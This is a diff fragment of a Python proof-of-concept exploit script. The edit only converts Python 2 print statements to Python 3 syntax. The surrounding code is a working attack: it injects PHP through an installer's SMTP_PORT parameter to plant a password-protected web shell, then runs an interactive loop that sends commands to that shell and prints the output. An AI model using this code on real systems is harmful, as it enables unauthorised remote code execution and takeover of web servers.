@@ -12,8 +12,8 @@ def poc():
 		url1 = target.url + "?sc[SMTP_PORT]=25\\\\');echo `$_POST[%s]`;//" % password
 		r = requests.get(url1)
 		shell = target.url.replace("install/index.php","index.php")
-		print "[*] The shell url: " + shell
-		print "[*] The shell password: " + password
+		print("[*] The shell url: " + shell)
+		print("[*] The shell password: " + password)
 
 		while 1:
 			try:
@@ -23,11 +23,11 @@ def poc():
 						password : command
 					}
 					r = requests.post(shell, data=postdata)
-					print r.text.encode(r.encoding)[:r.text.find("<!DOCTYPE HTML>")]
+					print(r.text.encode(r.encoding)[:r.text.find("<!DOCTYPE HTML>")])
 				else:
 					break
 			except EOFError as e:
-				print "[*] type 'exit' to quit"
+				print("[*] type 'exit' to quit")
 				pass
 
 		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
